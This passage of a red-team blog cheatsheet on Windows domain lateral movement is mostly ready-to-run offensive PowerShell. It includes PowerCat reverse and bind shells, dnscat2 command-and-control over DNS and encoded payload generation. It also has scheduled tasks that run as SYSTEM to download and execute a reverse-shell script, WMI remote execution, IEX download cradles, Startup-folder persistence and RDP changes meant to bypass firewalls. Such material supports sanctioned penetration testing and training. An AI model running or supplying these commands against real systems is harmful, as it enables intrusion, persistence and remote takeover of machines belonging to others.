</span></span></code></pre></div><h2 id=powercat>PowerCat</h2><p>Import the PowerCat module:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>.</span> <span class=p>.\</span><span class=n>powercat</span><span class=p>.</span><span class=py>ps1</span>
</span></span></code></pre></div><p>Listen on port 8000 and print the output to the console. Rememeber to add -t (timeout) parameter: number of seconds to wait before giving up on listening or connecting:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>powercat</span> <span class=n>-l</span> <span class=n>-p</span> <span class=mf>8000</span> <span class=n>-t</span> <span class=mf>1000</span>
</span></span></code></pre></div><p>Connect to 10.1.1.1 port 443, send a shell, and enable verbosity:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>powercat</span> <span class=n>-c</span> <span class=mf>10.1</span><span class=p>.</span><span class=py>1</span><span class=p>.</span><span class=py>1</span> <span class=n>-p</span> <span class=mf>443</span> <span class=n>-e</span> <span class=n>cmd</span> <span class=n>-v</span>
</span></span></code></pre></div><p>Connect to 10.1.1.1 port 443, execute a pseudo Powershell session, and enable verbosity:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>powercat</span> <span class=n>-c</span> <span class=mf>10.1</span><span class=p>.</span><span class=py>1</span><span class=p>.</span><span class=py>1</span> <span class=n>-p</span> <span class=mf>443</span> <span class=n>-ep</span> <span class=n>-v</span>
</span></span></code></pre></div><p>Send a file to 10.1.1.15 port 8000:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>powercat</span> <span class=n>-c</span> <span class=mf>10.1</span><span class=p>.</span><span class=py>1</span><span class=p>.</span><span class=py>15</span> <span class=n>-p</span> <span class=mf>8000</span> <span class=n>-i</span> <span class=n>C:</span><span class=p>\</span><span class=n>inputfile</span>
</span></span></code></pre></div><p>Write the data sent to the local listener on port 4444 to C::</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>powercat -l -p 4444 -of C:\outfile
</span></span></code></pre></div><p>Listen on port 8000 and repeatedly server a powershell shell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>powercat</span> <span class=n>-l</span> <span class=n>-p</span> <span class=mf>8000</span> <span class=n>-ep</span> <span class=n>-rep</span>
</span></span></code></pre></div><p>Relay traffic coming in on port 8000 over tcp to port 9000 on 10.1.1.1 over tcp:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>powercat</span> <span class=n>-l</span> <span class=n>-p</span> <span class=mf>8000</span> <span class=n>-r</span> <span class=n>tcp</span><span class=err>:</span><span class=mf>10.1</span><span class=p>.</span><span class=py>1</span><span class=p>.</span><span class=mf>1</span><span class=err>:</span><span class=mf>9000</span>
</span></span></code></pre></div><p>Connect to the dnscat2 server on c2.example.com, and send dns queries to the dns server on 10.1.1.1 port 53 (Get the server here: <a href=https://github.com/iagox86/dnscat2%29 target=_blank rel=noopener>https://github.com/iagox86/dnscat2)</a>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>powercat</span> <span class=n>-c</span> <span class=mf>10.1</span><span class=p>.</span><span class=py>1</span><span class=p>.</span><span class=py>1</span> <span class=n>-p</span> <span class=mf>53</span> <span class=n>-dns</span> <span class=n>c2</span><span class=p>.</span><span class=py>example</span><span class=p>.</span><span class=py>com</span>
</span></span></code></pre></div><p>Relay traffic coming in on port 8000 over tcp to the dnscat2 server on c2.example.com, sending queries to 10.1.1.1 port 53:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>powercat</span> <span class=n>-l</span> <span class=n>-p</span> <span class=mf>8000</span> <span class=n>-r</span> <span class=n>dns</span><span class=err>:</span><span class=mf>10.1</span><span class=p>.</span><span class=py>1</span><span class=p>.</span><span class=mf>1</span><span class=err>:</span><span class=mf>53</span><span class=err>:</span><span class=n>c2</span><span class=p>.</span><span class=py>example</span><span class=p>.</span><span class=py>com</span>
</span></span></code></pre></div><p>(-d) Disconnect. powercat will disconnect after the connection is established and the input from -i is sent. Used for scanning.</p><p>Generate Payload. Returns a script as a string which will execute the powercat with the options you have specified. -i, -d, and -rep will not be incorporated:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>powercat</span> <span class=n>-c</span> <span class=mf>10.1</span><span class=p>.</span><span class=py>1</span><span class=p>.</span><span class=py>1</span> <span class=n>-p</span> <span class=mf>443</span> <span class=n>-ep</span> <span class=n>-g</span>
</span></span></code></pre></div><p>Generate Encoded Payload. Does the same as -g, but returns a string which can be executed in this way: powershell -E</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>powercat</span> <span class=n>-c</span> <span class=mf>10.1</span><span class=p>.</span><span class=py>1</span><span class=p>.</span><span class=py>1</span> <span class=n>-p</span> <span class=mf>443</span> <span class=n>-ep</span> <span class=o>-ge</span>
</span></span></code></pre></div><p>Basic TCP Port Scanner:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>(</span><span class=mf>21</span><span class=p>,</span><span class=mf>22</span><span class=p>,</span><span class=mf>80</span><span class=p>,</span><span class=mf>443</span><span class=p>)</span> <span class=p>|</span> <span class=p>%</span> <span class=p>{</span><span class=n>powercat</span> <span class=n>-c</span> <span class=mf>10.1</span><span class=p>.</span><span class=py>1</span><span class=p>.</span><span class=py>10</span> <span class=n>-p</span> <span class=nv>$_</span> <span class=n>-t</span> <span class=mf>1</span> <span class=n>-Verbose</span> <span class=n>-d</span><span class=p>}</span>
</span></span></code></pre></div><p>Start A Persistent Server That Serves a File:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>powercat</span> <span class=n>-l</span> <span class=n>-p</span> <span class=mf>443</span> <span class=n>-i</span> <span class=n>C:</span><span class=p>\</span><span class=n>inputfile</span> <span class=n>-rep</span>
</span></span></code></pre></div><h2 id=remote-desktop>Remote Desktop</h2><p>Enable RDP on a machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Set-ItemProperty</span> <span class=n>-Path</span> <span class=s1>&#39;HKLM:\System\CurrentControlSet\Control\Terminal Server&#39;</span> <span class=n>-name</span> <span class=s2>&#34;fDenyTSConnections&#34;</span> <span class=n>-value</span> <span class=n>0Enable-NetFirewallRule</span> <span class=n>-DisplayGroup</span> <span class=s2>&#34;Remote Desktop&#34;</span>
</span></span></code></pre></div><p>Change RDP port to 55555 (in order to bypass firewalls):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Set-ItemProperty</span> <span class=n>-Path</span> <span class=s2>&#34;HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\&#34;</span> <span class=n>-Name</span> <span class=n>PortNumber</span> <span class=n>-Value</span> <span class=mf>55555</span>
</span></span><span class=line><span class=cl><span class=nb>New-NetFirewallRule</span> <span class=n>-DisplayName</span> <span class=s2>&#34;New RDP Port 55555&#34;</span> <span class=n>-Direction</span> <span class=n>Inbound</span> <span class=n>-LocalPort</span> <span class=mf>55555</span> <span class=n>-Protocol</span> <span class=n>TCP</span> <span class=n>-Action</span> <span class=n>allow</span>
</span></span><span class=line><span class=cl><span class=nb>New-NetFirewallRule</span> <span class=n>-DisplayName</span> <span class=s2>&#34;New RDP Port 55555&#34;</span> <span class=n>-Direction</span> <span class=n>Inbound</span> <span class=n>-LocalPort</span> <span class=mf>55555</span> <span class=n>-Protocol</span> <span class=n>UDP</span> <span class=n>-Action</span> <span class=n>allow</span>
</span></span><span class=line><span class=cl><span class=n>net</span> <span class=n>stop</span> <span class=n>termservice</span> <span class=p>/</span><span class=n>ynet</span> <span class=nb>start </span><span class=n>termservice</span> <span class=p>/</span><span class=n>y</span>
</span></span></code></pre></div><h2 id=scheduled-tasks>Scheduled Tasks</h2><p>Launch a scheduled task on a remote host to download and execute the script for a reverse shell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># File share via Web Server</span>
</span></span><span class=line><span class=cl><span class=n>schtasks</span> <span class=p>/</span><span class=n>delete</span> <span class=p>/</span><span class=n>S</span> <span class=s2>&#34;COMPUTER01&#34;</span> <span class=p>/</span><span class=n>TN</span> <span class=s2>&#34;JAVA_CHECK&#34;</span><span class=n>schtasks</span> <span class=p>/</span><span class=n>create</span> <span class=p>/</span><span class=n>S</span> <span class=s2>&#34;COMPUTER01&#34;</span> <span class=p>/</span><span class=nb>SC </span><span class=n>Minute</span> <span class=p>/</span><span class=n>RU</span> <span class=s2>&#34;NT Authority\SYSTEM&#34;</span> <span class=p>/</span><span class=n>TN</span> <span class=s2>&#34;JAVA_CHECK&#34;</span> <span class=p>/</span><span class=n>TR</span> <span class=s2>&#34;powershell.exe -ep bypass -c &#39;iex (New-Object Net.WebClient).DownloadString(&#39;&#39;http://192.168.50.53/powercat_connect.ps1&#39;&#39;&#39;)&#39;&#34;</span><span class=n>schtasks</span> <span class=p>/</span><span class=n>run</span> <span class=p>/</span><span class=n>S</span> <span class=s2>&#34;COMPUTER01&#34;</span> <span class=p>/</span><span class=n>TN</span> <span class=s2>&#34;JAVA_CHECK&#34;</span><span class=c># File share via SMBNew-SmbShare -Path c:\users\student01\Desktop\shared -Name shared -FullAccess Everyoneschtasks /delete /S &#34;COMPUTER01&#34; /TN &#34;JAVA_CHECK&#34;# Only domain users can access the file share.# To run as SYSTEM the file must reside on the remote machine.schtasks /create /S &#34;COMPUTER01&#34; /SC Minute /RU &#34;CYBERLAB\Administrator&#34; /TN &#34;JAVA_CHECK&#34; /TR &#34;powershell.exe -ep bypass -c &#39;. \\192.168.50.53\shared\powercat.ps1; powercat -c 192.168.50.53 -p 443 -e cmd&#39;&#34;schtasks /run /S &#34;COMPUTER01&#34; /TN &#34;JAVA_CHECK&#34;</span>
</span></span></code></pre></div><h2 id=wmi>WMI</h2><p><em>Requires ‘Host’ and ‘RPCSS’ SPNs</em></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Invoke-WmiMethod</span> <span class=n>win32_process</span> <span class=n>-ComputerName</span> <span class=s2>&#34;COMPUTER01.CYBERLAB.LOCAL&#34;</span> <span class=n>-name</span> <span class=n>create</span> <span class=n>-argumentlist</span> <span class=s2>&#34;powershell.exe -e </span><span class=nv>$encodedCommand</span><span class=s2>&#34;</span>
</span></span></code></pre></div><h2 id=file-download>File download</h2><p>Simple download:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Any version</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>Net</span><span class=p>.</span><span class=n>WebClient</span><span class=p>).</span><span class=py>DownloadFile</span><span class=p>(</span><span class=s2>&#34;http://192.168.119.155/PowerUp.ps1&#34;</span><span class=p>,</span> <span class=s2>&#34;C:\Windows\Temp\PowerUp.ps1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Powershell 4+</span>
</span></span><span class=line><span class=cl><span class=c>## You can use &#39;IWR&#39; as a shorthand</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-WebRequest</span> <span class=s2>&#34;http://10.10.16.7/Incnspc64.exe&#34;</span> <span class=n>-OutFile</span> <span class=s2>&#34;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Incnspc64.exe&#34;</span>
</span></span></code></pre></div><p>Load file reflectively:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>IEX </span><span class=p>(</span><span class=nb>New-Object</span> <span class=n>Net</span><span class=p>.</span><span class=n>WebClient</span><span class=p>).</span><span class=py>DownloadString</span><span class=p>(</span><span class=s1>&#39;http://10.10.16.7/PowerView.ps1&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p>Encode one-liner:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$command</span> <span class=p>=</span> <span class=s1>&#39;IEX (New-Object Net.WebClient).DownloadString(&#34;http://172.16.100.55/Invoke-PowerShellTcpRun.ps1&#34;)&#39;</span>
</span></span><span class=line><span class=cl><span class=nv>$bytes</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.Text.Encoding</span><span class=p>]::</span><span class=n>Unicode</span><span class=p>.</span><span class=py>GetBytes</span><span class=p>(</span><span class=nv>$command</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nv>$encodedCommand</span> <span class=p>=</span> <span class=p>[</span><span class=no>Convert</span><span class=p>]::</span><span class=n>ToBase64String</span><span class=p>(</span><span class=nv>$bytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>powershell</span> <span class=n>-EncodedCommand</span> <span class=nv>$encodedCommand</span>
</span></span></code></pre></div><h2 id=smb-shares>SMB Shares</h2><p>Create a SMB share:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># MACHINE: COMPUTER1</span>
</span></span><span class=line><span class=cl><span class=nb>New-SmbShare</span> <span class=n>-Name</span> <span class=s2>&#34;SHARED_REPO&#34;</span> <span class=n>-Path</span> <span class=s2>&#34;C:\Users\Public\&#34;</span> <span class=n>-FullAccess</span> <span class=s2>&#34;CYBERLAB\STUDENT1&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Grant-SmbShareAccess</span> <span class=n>-Name</span> <span class=s2>&#34;SHARED_REPO&#34;</span> <span class=n>-AccountName</span> <span class=s2>&#34;CYBERLAB\STUDENT2&#34;</span> <span class=n>-AccessRight</span> <span class=n>Full</span>
</span></span><span class=line><span class=cl><span class=nb>New-SmbShare</span> <span class=n>-Name</span> <span class=s2>&#34;SHARED_REPO&#34;</span> <span class=n>-Path</span> <span class=s2>&#34;C:\Users\Public\&#34;</span> <span class=n>-FullAccess</span> <span class=s2>&#34;Everyone&#34;</span>
</span></span></code></pre></div><p>Connect to a SMB share:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># USER: CYBERLAB\STUDENT1</span>
</span></span><span class=line><span class=cl><span class=n>net</span> <span class=n>use</span> <span class=n>z:</span> <span class=p>\\</span><span class=n>COMPUTER1</span><span class=p>\</span><span class=n>SHARED_REPO</span>
</span></span><span class=line><span class=cl><span class=n>net</span> <span class=n>use</span> <span class=n>z:</span> <span class=p>\\</span><span class=n>COMPUTER1</span><span class=p>\</span><span class=n>SHARED_REPO</span> <span class=p>/</span><span class=n>u:CYBERLAB</span><span class=p>\</span><span class=n>STUDENT01</span> <span class=n>Password123</span><span class=p>.</span>
</span></span></code></pre></div><p>or:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>New-SmbMapping</span> <span class=n>-LocalPath</span> <span class=s2>&#34;x:&#34;</span> <span class=n>-RemotePath</span> <span class=s2>&#34;\\COMPUTER1\SHARED_REPO&#34;</span> <span class=n>-Username</span> <span class=s2>&#34;CYBERLAB\STUDENTI1&#34;</span> <span class=n>-Password</span> <span class=s2>&#34;Password123.&#34;</span>
</span></span></code></pre></div><h2 id=powershell-webserver>PowerShell WebServer</h2><p>Start a web server on port 8080 in order to share files:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># MACHINE: COMPUTER1</span>
</span></span><span class=line><span class=cl><span class=c># Start-WebServer.ps1</span>
</span></span><span class=line><span class=cl><span class=p>.\</span><span class=nb>Start-WebServer</span><span class=p>.</span><span class=py>ps1</span> <span class=s2>&#34;http://+:8080/&#34;</span>
</span></span></code></pre></div><p>Download a file from another machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># MACHINE: COMPUTER 2</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-WebRequest</span> <span class=n>-Uri</span> <span class=n>http</span><span class=err>:</span><span class=p>//</span><span class=n>COMPUTER1</span><span class=err>:</span><span class=mf>8080</span><span class=p>/</span><span class=n>file</span><span class=p>.</span><span class=py>ps1</span> <span class=n>-OutFile</span> <span class=p>.\</span><span class=n>file</span><span class=p>.</span><span class=py>ps1</span>
</span></span><span class=line><span class=cl><span class=nb>iex </span><span class=p>(</span><span class=nb>New-Object</span> <span class=n>Net</span><span class=p>.</span><span class=n>WebClient</span><span class=p>).</span><span class=py>DownloadString</span><span class=p>(</span><span class=s1>&#39;http://COMPUTER1:8080/PowerUp.ps1&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-AllChecks</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># It can be even used from an MSSQL instance</span>
</span></span><span class=line><span class=cl><span class=nb>Execute-Command</span><span class=n>-MSSQL</span> <span class=n>-UserName</span> <span class=s1>&#39;sa&#39;</span> <span class=n>-Password</span> <span class=s1>&#39;Password&#39;</span> <span class=n>-ComputerName</span> <span class=s1>&#39;MSSQLSERVER01&#39;</span> <span class=n>-payload</span> <span class=s2>&#34;iex (New-Object Net.WebClient).DownloadString(&#39;http://192.168.1.10:8080/PowerUp.ps1&#39;); Invoke-AllChecks&#34;</span>
</span></span></code></pre></div><p>Close the web server:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># MACHINE: COMPUTER 2</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-WebRequest</span> <span class=n>-Uri</span> <span class=n>http</span><span class=err>:</span><span class=p>//</span><span class=n>COMPUTER1</span><span class=err>:</span><span class=mf>8080</span><span class=p>/</span><span class=n>quit</span>
</span></span></code></pre></div><h2 id=base64-script-conversion>Base64 script conversion</h2><p>In order to perform remote code execution it can be helpful to convert a script in <em>Base64</em> format:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$Base64</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.Convert</span><span class=p>]::</span><span class=n>ToBase64String</span><span class=p>([</span><span class=no>System.IO.File</span><span class=p>]::</span><span class=n>ReadAllBytes</span><span class=p>(</span><span class=s1>&#39;c:\path\to\script\file.ps1&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=n>powershell</span> <span class=n>-EncodedCommand</span> <span class=p>&lt;</span><span class=n>Base64String</span><span class=p>&gt;</span>
</span></span></code></pre></div><hr></div><div class=article-tags><a class="badge badge-light" href=/tag/cheatsheet/>Cheatsheet</a>
<a class="badge badge-light" href=/tag/red-teaming/>Red Teaming</a>
<a class="badge badge-light" href=/tag/windows/>Windows</a>
<a class="badge badge-light" href=/tag/active-directory/>Active Directory</a>
<a class="badge badge-light" href=/tag/lateral-movement/>Lateral Movement</a></div><div class=share-box><ul class=share><li><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fwww.peco602.com%2Fpost%2F0010-domain-lateral-movement-cheatsheet%2F&text=Domain+Lateral+Movement+cheatsheet" target=_blank rel=noopener class=share-btn-twitter aria-label=twitter><i class="fab fa-twitter"></i></a></li><li><a href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fwww.peco602.com%2Fpost%2F0010-domain-lateral-movement-cheatsheet%2F&t=Domain+Lateral+Movement+cheatsheet" target=_blank rel=noopener class=share-btn-facebook aria-label=facebook><i class="fab fa-facebook"></i></a></li><li><a href="mailto:?subject=Domain%20Lateral%20Movement%20cheatsheet&body=https%3A%2F%2Fwww.peco602.com%2Fpost%2F0010-domain-lateral-movement-cheatsheet%2F" target=_blank rel=noopener class=share-btn-email aria-label=envelope><i class="fas fa-envelope"></i></a></li><li><a href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Fwww.peco602.com%2Fpost%2F0010-domain-lateral-movement-cheatsheet%2F&title=Domain+Lateral+Movement+cheatsheet" target=_blank rel=noopener class=share-btn-linkedin aria-label=linkedin-in><i class="fab fa-linkedin-in"></i></a></li><li><a href="whatsapp://send?text=Domain+Lateral+Movement+cheatsheet%20https%3A%2F%2Fwww.peco602.com%2Fpost%2F0010-domain-lateral-movement-cheatsheet%2F" target=_blank rel=noopener class=share-btn-whatsapp aria-label=whatsapp><i class="fab fa-whatsapp"></i></a></li><li><a href="https://service.weibo.com/share/share.php?url=https%3A%2F%2Fwww.peco602.com%2Fpost%2F0010-domain-lateral-movement-cheatsheet%2F&title=Domain+Lateral+Movement+cheatsheet" target=_blank rel=noopener class=share-btn-weibo aria-label=weibo><i class="fab fa-weibo"></i></a></li></ul></div><div class="media author-card content-widget-hr"><a href=https://www.peco602.com/><img class="avatar mr-3 avatar-circle" src=/authors/admin/avatar_huf4f2a9d771509e6e0b947acc7d389632_627121_270x270_fill_q75_lanczos_center.jpg alt="Giovanni Pecoraro"></a><div class=media-body><h5 class=card-title><a href=https://www.peco602.com/>Giovanni Pecoraro</a></h5><h6 class=card-subtitle>Senior Security Engineer</h6><p class=card-text>My research interests include space systems, cyber security, signal processing and artificial intelligence.</p><ul class=network-icon aria-hidden=true><li><a href=/#contact><i class="fas fa-envelope"></i></a></li><li><a href=https://twitter.com/Peco602 target=_blank rel=noopener><i class="fab fa-twitter"></i></a></li><li><a href="https://scholar.google.com/citations?user=JSM2EcoAAAAJ" target=_blank rel=noopener><i class="ai ai-google-scholar"></i></a></li><li><a href=https://www.researchgate.net/profile/Giovanni-Pecoraro target=_blank rel=noopener><i class="fab fa-researchgate"></i></a></li><li><a href=https://github.com/Peco602 target=_blank rel=noopener><i class="fab fa-github"></i></a></li><li><a href=https://it.linkedin.com/in/giovanni-pecoraro-078500155 target=_blank rel=noopener><i class="fab fa-linkedin"></i></a></li><li><a href=/uploads/resume.pdf><i class="ai ai-cv"></i></a></li></ul></div></div><script src=https://utteranc.es/client.js repo=Peco602/peco602.github.io issue-term=pathname label=comment theme=github-light crossorigin=anonymous async></script></div></article></div><div class=page-footer><div class=container><footer class=site-footer><p class="powered-by copyright-license-text">© 2023 Me. This work is licensed under <a href=https://creativecommons.org/licenses/by-nc-nd/4.0 rel="noopener noreferrer" target=_blank>CC BY NC ND 4.0</a></p><p class="powered-by footer-license-icons"><a href=https://creativecommons.org/licenses/by-nc-nd/4.0 rel="noopener noreferrer" target=_blank aria-label="Creative Commons"><i class="fab fa-creative-commons fa-2x" aria-hidden=true></i>
<i class="fab fa-creative-commons-by fa-2x" aria-hidden=true></i>
<i class="fab fa-creative-commons-nc fa-2x" aria-hidden=true></i>
<i class="fab fa-creative-commons-nd fa-2x" aria-hidden=true></i></a></p><p class=powered-by>Published with <a href="https://wowchemy.com/?utm_campaign=poweredby" target=_blank rel=noopener>Wowchemy</a> — the free, <a href=https://github.com/wowchemy/wowchemy-hugo-themes target=_blank rel=noopener>open source</a> website builder that empowers creators.</p></footer></div></div><script src=/js/vendor-bundle.min.d26509351aa0ff874abbee824e982e9b.js></script>
<script id=search-hit-fuse-template type=text/x-template>
    <div class="search-hit" id="summary-{{key}}">
      <div class="search-hit-content">
        <div class="search-hit-name">
          <a href="{{relpermalink}}">{{title}}</a>
          <div class="article-metadata search-hit-type">{{type}}</div>
          <p class="search-hit-description">{{snippet}}</p>
        </div>
      </div>
    </div>
  </script><script src=https://cdn.jsdelivr.net/gh/krisk/Fuse@v3.2.1/dist/fuse.min.js integrity="sha512-o38bmzBGX+hD3JHWUFCDA09btWaqrNmoJ3RXLlrysA7PP01Kgs4UlE4MhelE1v5dJR3+cxlR4qQlotsW7jKsnw==" crossorigin=anonymous></script>
<script src=https://cdn.jsdelivr.net/gh/julmot/mark.js@8.11.1/dist/jquery.mark.min.js integrity="sha512-mhbv5DqBMgrWL+32MmsDOt/OAvqr/cHimk6B8y/bx/xS88MVkYGPiVv2ixKVrkywF2qHplNRUvFsAHUdxZ3Krg==" crossorigin=anonymous></script>
<script id=page-data type=application/json>{"use_headroom":true}</script><script src=/js/wowchemy-headroom.db4755770454eb63685f8de785c0a172.js type=module></script>
<script src=/en/js/wowchemy.min.e8ee06ba8371980ffde659871dd593b0.js></script><div id=modal class="modal fade" role=dialog><div class=modal-dialog><div class=modal-content><div class=modal-header><h5 class=modal-title>Cite</h5><button type=button class=close data-dismiss=modal aria-label=Close>
<span aria-hidden=true>&#215;</span></button></div><div class=modal-body><pre><code></code></pre></div><div class=modal-footer><a class="btn btn-outline-primary my-1 js-copy-cite" href=# target=_blank><i class="fas fa-copy"></i> Copy</a>
<a class="btn btn-outline-primary my-1 js-download-cite" href=# target=_blank><i class="fas fa-download"></i> Download</a><div id=modal-error></div></div></div></div></div><script src=/js/wowchemy-publication.68f8d7090562ca65fc6d3cb3f8f2d2cb.js type=module></script></body></html>